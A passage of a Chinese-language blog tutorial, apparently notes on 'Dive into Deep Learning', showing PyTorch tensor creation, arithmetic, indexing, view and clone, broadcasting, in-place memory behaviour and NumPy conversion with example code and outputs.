class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还可以通过现有的Tensor来创建，此方法会默认重用输入Tensor的一些属性，例如数据类型，除非自定义数据类型。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> x<span class="token punctuation">.</span>new_ones<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float64<span class="token punctuation">)</span>  <span class="token comment"># 返回的tensor默认具有相同的torch.dtype和torch.device</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn_like<span class="token punctuation">(</span>x<span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span><span class="token builtin">float</span><span class="token punctuation">)</span> <span class="token comment"># 指定新的数据类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float64<span class="token punctuation">)</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">0.6035</span><span class="token punctuation">,</span>  <span class="token number">0.8110</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.0451</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">0.8797</span><span class="token punctuation">,</span>  <span class="token number">1.0482</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.0445</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0.7229</span><span class="token punctuation">,</span>  <span class="token number">2.8663</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.5655</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">0.1604</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.0254</span><span class="token punctuation">,</span>  <span class="token number">1.0739</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">2.2628</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.9175</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.2251</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过shape或size()来获取Tensor的形状</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token comment">#均为torch.Size([5,3])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：返回的torch.Size其实就是一个tuple, 支持所有tuple的操作。<br><img src="/2023/04/12/dong-shou-xue-shen-du-xue-xi-1/image1.jpg"></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="算术操作"><a href="#算术操作" class="headerlink" title="算术操作"></a>算术操作</h4><p>加法形式1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加法形式2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>torch<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还可以指定输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> torch<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>torch<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> out<span class="token operator">=</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>加法形式3</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># adds x to y</span>y<span class="token punctuation">.</span>add_<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注：PyTorch操作inplace版本都有后缀_, 例如x.copy_(y), x.t_()</p><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>我们还可以使用类似NumPy的索引操作来访问Tensor的一部分，需要注意的是：索引出来的结果与原数据共享内存，也即修改一个，另一个会跟着修改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment">#第一行的，从头到尾</span>y <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 源tensor也被改了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/dong-shou-xue-shen-du-xue-xi-1/image2.jpg"></p><h4 id="改变形状"><a href="#改变形状" class="headerlink" title="改变形状"></a>改变形状</h4><p>用view()来改变Tensor的形状</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>z <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment"># -1所指的维度可以根据其他维度的值推出来</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> z<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意view()返回的新Tensor与源Tensor虽然可能有不同的size，但是是共享data的，也即更改其中的一个，另外一个也会跟着改变。(顾名思义，view仅仅是改变了对这个张量的观察角度，内部数据并未改变)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token comment"># 也加了1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1.6035</span><span class="token punctuation">,</span> <span class="token number">1.8110</span><span class="token punctuation">,</span> <span class="token number">0.9549</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1.8797</span><span class="token punctuation">,</span> <span class="token number">2.0482</span><span class="token punctuation">,</span> <span class="token number">0.9555</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0.2771</span><span class="token punctuation">,</span> <span class="token number">3.8663</span><span class="token punctuation">,</span> <span class="token number">0.4345</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1.1604</span><span class="token punctuation">,</span> <span class="token number">0.9746</span><span class="token punctuation">,</span> <span class="token number">2.0739</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">3.2628</span><span class="token punctuation">,</span> <span class="token number">0.0825</span><span class="token punctuation">,</span> <span class="token number">0.7749</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.6035</span><span class="token punctuation">,</span> <span class="token number">1.8110</span><span class="token punctuation">,</span> <span class="token number">0.9549</span><span class="token punctuation">,</span> <span class="token number">1.8797</span><span class="token punctuation">,</span> <span class="token number">2.0482</span><span class="token punctuation">,</span> <span class="token number">0.9555</span><span class="token punctuation">,</span> <span class="token number">0.2771</span><span class="token punctuation">,</span> <span class="token number">3.8663</span><span class="token punctuation">,</span> <span class="token number">0.4345</span><span class="token punctuation">,</span>        <span class="token number">1.1604</span><span class="token punctuation">,</span> <span class="token number">0.9746</span><span class="token punctuation">,</span> <span class="token number">2.0739</span><span class="token punctuation">,</span> <span class="token number">3.2628</span><span class="token punctuation">,</span> <span class="token number">0.0825</span><span class="token punctuation">,</span> <span class="token number">0.7749</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以如果我们想返回一个真正新的副本（即不共享data内存）该怎么办呢？Pytorch还提供了一个reshape()可以改变形状，但是此函数并不能保证返回的是其拷贝，所以不推荐使用。推荐先用clone创造一个副本然后再使用view。<a href="https://stackoverflow.com/questions/49643225/whats-the-difference-between-reshape-and-view-in-pytorch">参考此处</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x_cp <span class="token operator">=</span> x<span class="token punctuation">.</span>clone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>x <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_cp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">0.6035</span><span class="token punctuation">,</span>  <span class="token number">0.8110</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.0451</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">0.8797</span><span class="token punctuation">,</span>  <span class="token number">1.0482</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.0445</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0.7229</span><span class="token punctuation">,</span>  <span class="token number">2.8663</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.5655</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">0.1604</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.0254</span><span class="token punctuation">,</span>  <span class="token number">1.0739</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span> <span class="token number">2.2628</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.9175</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.2251</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.6035</span><span class="token punctuation">,</span> <span class="token number">1.8110</span><span class="token punctuation">,</span> <span class="token number">0.9549</span><span class="token punctuation">,</span> <span class="token number">1.8797</span><span class="token punctuation">,</span> <span class="token number">2.0482</span><span class="token punctuation">,</span> <span class="token number">0.9555</span><span class="token punctuation">,</span> <span class="token number">0.2771</span><span class="token punctuation">,</span> <span class="token number">3.8663</span><span class="token punctuation">,</span> <span class="token number">0.4345</span><span class="token punctuation">,</span>        <span class="token number">1.1604</span><span class="token punctuation">,</span> <span class="token number">0.9746</span><span class="token punctuation">,</span> <span class="token number">2.0739</span><span class="token punctuation">,</span> <span class="token number">3.2628</span><span class="token punctuation">,</span> <span class="token number">0.0825</span><span class="token punctuation">,</span> <span class="token number">0.7749</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用clone还有一个好处是会被记录在计算图中，即梯度回传到副本时也会传到源Tensor。<br>另外一个常用的函数就是item(), 它可以将一个标量Tensor转换成一个Python number：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2.3466</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">2.3466382026672363</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h4><p><img src="/2023/04/12/dong-shou-xue-shen-du-xue-xi-1/image3.jpg"><br>PyTorch中的Tensor支持超过一百种操作，包括转置、索引、切片、数学运算、线性代数、随机数等等，可参考<a href="https://pytorch.org/docs/stable/tensors.html">官方文档</a></p><h4 id="广播机制"><a href="#广播机制" class="headerlink" title="广播机制"></a>广播机制</h4><p>(之前都是相同形状运算)当对两个形状不同的Tensor按元素运算时，可能会触发广播（broadcasting）机制：先适当复制元素使这两个Tensor形状相同后再按元素运算。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>y <span class="token operator">=</span> torch<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于x和y分别是1行2列和3行1列的矩阵，如果要计算x + y，那么x中第一行的2个元素被广播（复制）到了第二行和第三行，而y中第一列的3个元素被广播（复制）到了第二列。如此，就可以对2个3行2列的矩阵按元素相加。</p><h3 id="运算的内存开销"><a href="#运算的内存开销" class="headerlink" title="运算的内存开销"></a>运算的内存开销</h3><p>索引操作是不会开辟新内存的，而像y = x + y这样的运算是会新开内存的，然后将y指向新内存。为了演示这一点，我们可以使用Python自带的id函数：如果两个实例的ID一致，那么它们所对应的内存地址相同；反之则不同。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>id_before <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>y <span class="token operator">=</span> y <span class="token operator">+</span> x<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> id_before<span class="token punctuation">)</span> <span class="token comment"># False </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想指定结果到原来的y的内存，我们可以使用前面介绍的索引来进行替换操作。在下面的例子中，我们把x + y的结果通过[:]写进y对应的内存中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>id_before <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>y<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> y <span class="token operator">+</span> x<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> id_before<span class="token punctuation">)</span> <span class="token comment"># True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们还可以使用运算符全名函数中的out参数或者自加运算符+=(也即add_())达到上述效果，例如torch.add(x, y, out=y)和y += x(y.add_(x))。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>id_before <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>torch<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> out<span class="token operator">=</span>y<span class="token punctuation">)</span> <span class="token comment"># y += x, y.add_(x)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> id_before<span class="token punctuation">)</span> <span class="token comment"># True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：虽然view返回的Tensor与源Tensor是共享data的，但是依然是一个新的Tensor（因为Tensor除了包含data外还有一些其他属性），二者id（内存地址）并不一致。</p><h3 id="Tensor和Numpy相互转换"><a href="#Tensor和Numpy相互转换" class="headerlink" title="Tensor和Numpy相互转换"></a>Tensor和Numpy相互转换</h3><p>我们很容易用numpy()和from_numpy()将Tensor和NumPy中的数组相互转换。但是需要注意的一点是： 这两个函数所产生的的Tensor和NumPy中的数组共享相同的内存（所以他们之间的转换很快），改变其中一个时另一个也会改变！！！</p><blockquote><p>还有一个常用的将NumPy中的array转换成Tensor的方法就是torch.tensor(), 需要注意的是，此方法总是会进行数据拷贝（就会消耗更多的时间和空间），所以返回的Tensor和原来的数据不再共享内存。</p></blockquote><h4 id="Tensor转Numpy"><a href="#Tensor转Numpy" class="headerlink" title="Tensor转Numpy"></a>Tensor转Numpy</h4><p>使用numpy()将Tensor转换成NumPy数组:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> torch<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>b <span class="token operator">=</span> a<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>a <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>b <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">1.</span> <span class="token number">1.</span> <span class="token number">1.</span> <span class="token number">1.</span> <span class="token number">1.</span><span class="token punctuation">]</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">2.</span> <span class="token number">2.</span> <span class="token number">2.</span> <span class="token number">2.</span> <span class="token number">2.</span><span class="token punctuation">]</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">3.</span> <span class="token number">3.</span> <span class="token number">3.</span> <span class="token number">3.</span> <span class="token number">3.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="NumPy数组转Tensor"><a href="#NumPy数组转Tensor" class="headerlink" title="NumPy数组转Tensor"></a>NumPy数组转Tensor</h4><p>使用from_numpy()将NumPy数组转换成Tensor:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npa <span class="token operator">=</span> np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>b <span class="token operator">=</span> torch<span class="token punctuation">.</span>from_numpy<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>a <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>b <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">1.</span> <span class="token number">1.</span> <span class="token number">1.</span> <span class="token number">1.</span> <span class="token number">1.</span><span class="token punctuation">]</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float64<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2.</span> <span class="token number">2.</span> <span class="token number">2.</span> <span class="token number">2.</span> <span class="token number">2.</span><span class="token punctuation">]</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float64<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3.</span> <span class="token number">3.</span> <span class="token number">3.</span> <span class="token number">3.</span> <span class="token number">3.</span><span class="token punctuation">]</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 